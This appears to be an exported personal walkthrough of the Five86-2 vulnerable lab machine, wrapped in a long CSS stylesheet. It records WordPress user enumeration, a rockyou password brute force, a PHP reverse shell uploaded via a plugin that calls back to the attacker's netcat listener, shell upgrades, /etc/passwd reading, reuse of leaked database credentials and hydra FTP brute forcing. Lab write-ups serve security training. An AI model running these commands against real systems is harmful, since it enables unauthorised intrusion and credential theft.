@@ -1,0 +1,747 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Five86-2</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	opacity: 0.5;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif; }
+.mono { font-family: Nitti, 'Microsoft YaHei', '微软雅黑', monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, Nitti, 'Microsoft YaHei', '微软雅黑', monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="91046de2-4e31-4e19-a308-91b594401ccb" class="page sans"><header><h1 class="page-title">Five86-2</h1></header><div class="page-body"><hr id="d51af0a2-3ea2-4816-9c48-3863fefa7985"/><p id="faa997fc-1134-4477-a65a-b2b7145a4205" class="">Notes</p><p id="ff8ba315-2f15-4ab0-a34c-46cab98a78e9" class="">
+</p><p id="c32138e6-acb1-4819-8eb0-a1fc2f04bd95" class="">Discovery </p><pre id="a881a2a3-a84d-477b-9e0a-d4fb51c74379" class="code"><code>
+netdiscover -i eth0 -r 192.168.61.1/24</code></pre><figure id="31198c0c-dfe1-44bb-8f28-21fe734a910e" class="image"><a href="Five86%202/five0.png"><img style="width:565px" src="Five86%202/five0.png"/></a></figure><p id="a8ad97de-0fd5-421f-b531-4406771d6b86" class="">
+</p><p id="76468c75-b0f3-41d3-81a1-0939ae813ad7" class="">
+</p><p id="40d5ec41-2a9c-42a5-b051-7664501cb051" class="">Scan</p><pre id="becef668-eb65-4421-9601-74d1a5636cc4" class="code"><code>nmap -sV -sC 192.168.61.222</code></pre><figure id="10695532-c15d-4c1b-a6e9-e4e6937edbe2" class="image"><a href="Five86%202/five1.png"><img style="width:816px" src="Five86%202/five1.png"/></a></figure><p id="2e82da40-2479-4bc3-97ba-5f233385b320" class="">
+</p><p id="5c41b2de-eec3-46ee-8be7-405e702a9059" class="">
+</p><p id="244848e4-8fb2-4808-8cb8-0fce6717af71" class="">WordPress</p><pre id="2ace44a2-569d-46d7-b12a-abf9ee56b9a9" class="code"><code>wpscan --url http://192.168.61.222 --api-token [TOKEN] --enumerate u p -o ~/wpscan.json -f json</code></pre><p id="6c6cd1a2-f5e6-4f22-8acd-a675ef658a13" class="">
+</p><p id="6e425f9e-4155-4a57-b187-0f07b3f45e59" class=""> Findings Summary</p><pre id="68a76cc6-8ac7-4501-ad76-b93d102e8905" class="code"><code>&quot;Server: Apache/2.4.41 (Ubuntu)&quot;
+&quot;url&quot;: &quot;http://192.168.61.222/xmlrpc.php&quot;
+&quot;to_s&quot;: &quot;Upload directory has listing enabled: http://192.168.61.222/wp-content/uploads/&quot;
+&quot;url&quot;: &quot;http://192.168.61.222/readme.html&quot;
+&quot;url&quot;: &quot;http://192.168.61.222/wp-cron.php&quot;
+<strong>&quot;Version number&quot;: &quot;5.1.4&quot;,
+&quot;users&quot;: {&quot;barney&quot;,&quot;peter&quot;,&quot;admin&quot;,&quot;gillian&quot;,&quot;stephen&quot;:}
+</strong></code></pre><p id="0569c159-dfba-47d7-aa6e-597b9f58680c" class="">
+</p><p id="16dc724d-8b2b-4abf-af56-1084bdcf7dba" class="">
+</p><p id="f2237176-96a3-4e1a-aa3b-4fd5f1a60177" class="">
+</p><p id="030719df-c61f-408f-b6cc-2658d9c26728" class="">bruteforce users  attack</p><p id="dafbdd09-b4e0-44fa-b854-d5a03b289f6c" class="">
+</p><p id="a67bc40c-09de-4c3d-8f86-74eaa26340b6" class="">
+</p><pre id="7f119157-e381-425f-b0a8-6a29040bd62d" class="code"><code>sudo wpscan --url http://192.168.61.222 --usernames &#x27;barney,peter,admin,gillian,stephen&#x27; --passwords /usr/share/wordlists/rockyou.txt
+	</code></pre><p id="7e0c3e9d-87ba-4d86-95ff-f007ef01ee79" class="">
+</p><pre id="5e68dda2-42de-4988-b82c-91207695b7d6" class="code"><code>NOTE: Gem::Specification#rubyforge_project= is deprecated with no replacement. It will be removed on or after 2019-12-01.
+Gem::Specification#rubyforge_project= called from /usr/share/rubygems-integration/all/specifications/i18n-0.7.0.gemspec:20.
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.9
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.61.222/ [192.168.61.222]
+[+] Started: Mon Mar  2 19:23:43 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.61.222/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://192.168.61.222/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.61.222/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] http://192.168.61.222/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.1.4 identified (Latest, released on 2019-12-12).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://192.168.61.222/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.4&#x27;
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://192.168.61.222/, Match: &#x27;WordPress 5.1.4&#x27;
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 &lt;=======================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 5 user/s
+[SUCCESS] - barney / spooky1
+[SUCCESS] - stephen / apollo1
+Trying peter / 120807 Time: 00:23:47 &lt;                                                                                                    &gt; (98765 / 43062497)  0.22%  ETA: ??:??:??^Cying admin / tacotaco Time: 00:49:54 &lt;                                                                                                 &gt; (202980 / 43062497)  0.47%  ETA: ??:??:??[i] Valid Combinations Found:
+ | Username: barney, Password: spooky1
+ | Username: stephen, Password: apollo1
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.                                                     &gt; (202985 / 43062497)  0.47%  ETA: ??:??:??[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Mon Mar  2 20:13:56 2020
+[+] Requests Done: 203029
+[+] Cached Requests: 11
+[+] Data Sent: 98.329 MB
+[+] Data Received: 119.479 MB
+[+] Memory used: 1.088 GB
+[+] Elapsed time: 00:50:1
+
+
+
+</code></pre><p id="c0a6649e-f5d6-4842-97fb-7819dc623c7d" class="">
+</p><p id="85089411-1d1f-41cb-97ca-a322204669bb" class="">
+</p><figure id="12c227bb-14e5-4c86-b0ea-0a5a99054e1e" class="image"><a href="Five86%202/fiveusers.png"><img style="width:637px" src="Five86%202/fiveusers.png"/></a></figure><p id="1cf8ad36-6639-4d1c-afbe-e62c5cee5de0" class="">
+</p><p id="fc6ad54b-7d01-4ee3-89e2-cc7d8ee17aed" class="">login using barney and looked at plugins </p><figure id="5f863d86-e35b-45ed-afcb-2ea80fb9076a" class="image"><a href="Five86%202/word.png"><img style="width:720px" src="Five86%202/word.png"/></a></figure><p id="129ed099-dd27-444b-bad2-84e4e5c8cd9b" class="">
+</p><p id="00bd2fe7-9438-44a0-a457-51b68b0bda4c" class="">quick google search and </p><p id="7884420c-be6b-4241-9d40-8c0674a13b91" class=""><a href="https://www.exploit-db.com/exploits/46981">https://www.exploit-db.com/exploits/46981</a></p><p id="950565f1-2241-487d-a712-21e4282708d6" class="">created two files with this </p><p id="bc3863b7-89cd-46ff-ba41-c3f41ef9021b" class="">
+</p><p id="81d5f8fb-2b61-44ff-8e65-a332fc3947cc" class="">1.php</p><pre id="add9a3a6-05a3-49e3-817f-af4b6e572d85" class="code"><code>&lt;?php
+exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.61.144/888 0&gt;&amp;1&#x27;&quot;);</code></pre><p id="1c623206-4281-4676-8871-5ced2c758ca7" class="">index.html</p><pre id="413eba7d-6431-4588-9ee0-befb5765840c" class="code"><code>&lt;html&gt;
+hi
+&lt;/html&gt;</code></pre><p id="4912ad22-2efc-4d38-845e-8a58da4f0227" class="">
+</p><p id="9332c5cd-cfa4-4095-b7ab-ac586c7d302c" class="">saved it to rev.zip </p><p id="b3003c7c-3bf3-4a89-aff8-20373521220b" class="">
+</p><p id="ae797549-aaaf-4798-a702-51b9cac4fa0e" class="">
+</p><p id="69f1a7d8-00a1-4cd4-80ca-24c3a0d9dc68" class="">and uploaded it using the plugin and publish content.</p><figure id="005a9ad0-838f-4d2b-a330-0d7277ac49e6" class="image"><a href="Five86%202/added.png"><img style="width:864px" src="Five86%202/added.png"/></a></figure><p id="b981b6b3-44f4-45a6-b13b-304398a3f51e" class="">
+</p><p id="e2d1e8ae-4d83-43cf-9d5e-8b942c3696f7" class="">
+</p><p id="24347b58-32ce-449b-842c-aa5b37d5dfad" class="">
+</p><p id="67c80bb6-59c5-44ef-b8e5-6f09f5ad2cd6" class="">setup netcat for listening </p><pre id="7270f90e-3bde-4706-813a-d194c84e1a08" class="code"><code>nc -lv -p 888</code></pre><p id="fe7f3411-3907-486e-a57d-efe0a4dd15ff" class="">goto to view uploaded content (look at recon )</p><pre id="e3432666-8620-403c-921c-e4c21bf9e140" class="code"><code> <a href="http://192.168.61.222/wp-content/uploads/articulate_uploads/ermi/">http://192.168.61.222/wp-content/uploads/articulate_uploads/rev/</a>1.php
+</code></pre><figure id="f5aaeecd-e284-43c4-89cf-879d67a81d88" class="image"><a href="Five86%202/netcat.png"><img style="width:695px" src="Five86%202/netcat.png"/></a></figure><p id="9345d2eb-1b16-4b04-908d-e92fae088dbf" class="">
+</p><p id="ce872d9d-270f-4718-89da-ae5aa63d96eb" class="">
+</p><p id="b3e6de0c-b228-4678-9e6a-499b9f6b5392" class="">make it interactive </p><p id="0ae422c7-f8b6-4708-a7fe-107027e0ffda" class="">/bin/sh -i</p><p id="1068bea2-c2d2-4f07-8871-13f29131e195" class="">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</p><p id="8a6ba5f4-6584-41e7-9f61-ad6908a13004" class="">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</p><p id="271f8718-01ff-4e74-8fc4-b8b44c0eb9b8" class="">export TERM=xterm </p><p id="8c083745-128b-4b54-a320-27300bc40cad" class="">export TERM=bash</p><p id="a211c56f-b036-4d6c-9253-6c7ff3205ac2" class="">
+</p><p id="10d0864b-acd9-4837-8e8b-3dcb69b56a73" class="">look for passwords</p><p id="3691ca6c-551b-46ca-a3d8-3c128b9028ca" class="">
+</p><p id="91bc4656-13a4-4820-9a21-c0f0f7838ef7" class="">
+</p><p id="54a8e381-6807-405f-af05-62e5f86ba640" class="">
+</p><p id="b40f1608-026d-40f8-910c-422b5498035a" class="">
+</p><p id="a6c295b3-76b5-4422-aeac-7ccf1aafe61b" class="">view available users</p><pre id="06ce78b2-0b43-481a-876c-0b39fda16cf3" class="code"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
+landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+<mark class="highlight-yellow">barney:x:1001:1001:Barney Sumner:/home/barney:/bin/bash
+</mark><mark class="highlight-yellow"><strong>stephen:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</strong></mark><mark class="highlight-yellow">
+</mark>peter:x:1003:1003:Peter Hook:/home/peter:/bin/bash
+gillian:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash
+richard:x:1005:1005:Richard Starkey:/home/richard:/bin/bash
+paul:x:1006:1006:Paul McCartney:/home/paul:/bin/bash
+john:x:1007:1007:John Lennon:/home/john:/bin/bash
+george:x:1008:1008:George Harrison:/home/george:/bin/bash
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</code></pre><p id="96e0d68b-e40b-4e0c-9c64-7f5e4b8f546a" class="">
+</p><p id="7a329324-f3e9-4eeb-8411-39dbb4e5ca51" class="">TRY</p><pre id="acde924f-2849-4092-96b9-b4f17f78fceb" class="code"><code>su barney 
+and 
+su stephen 
+
+
+
+stephen worked</code></pre><p id="632d3f1a-46aa-4f7f-80d4-e852fba47296" class="">
+</p><p id="6c98e0f8-c00e-4f53-8a4c-7eb0b25b13f3" class="">
+</p><p id="ec0a5a14-0501-450b-b026-c26d82206942" class="">
+</p><p id="db33b0b9-abfd-4976-99a1-bbbfbafc0e9b" class="">
+</p><p id="83ae1ae0-0dc2-45db-bf8f-6738fb62c014" class="">mysql -udbuser -p4Te3bRd483e -e &quot;show databases;&quot;</p><p id="db6e14b0-a838-43a9-bc6e-e757ca54e94b" class="">./sudo_killer.sh -c -i /path/sk_offline.txt</p><p id="71bc46f3-14b9-4edb-bd18-f85cc01775db" class="">./sudo.sh -c -e -r report.txt -p /tmp</p><p id="6ab321de-5fe9-487c-a2c5-4f719b2ec0d1" class="">
+</p><p id="c2d44e61-0cda-402c-a30f-d400b30bbb43" class="">hydra -L fusers.txt -P /usr/share/wordlists/rockyou.txt <a href="ftp://192.168.61.222/">ftp://192.168.61.222</a></p><p id="5cdd2023-b20e-459c-bf28-48f91f998483" class="">
+</p><p id="178bbe12-c4d1-4511-bd2b-6d024a903ab8" class="">define( &#x27;DB_PASSWORD&#x27;, &#x27;4Te3bRd483e&#x27; );define( &#x27;DB_PASSWORD&#x27;, &#x27;password_here&#x27; ); case &#x27;DB_PASSWORD&#x27;: define( &#x27;DB_PASSWORD&#x27;, $pwd );</p><p id="73971fc5-0ead-4849-9826-9b5501fdc182" class="">
+</p></div></article></body></html>
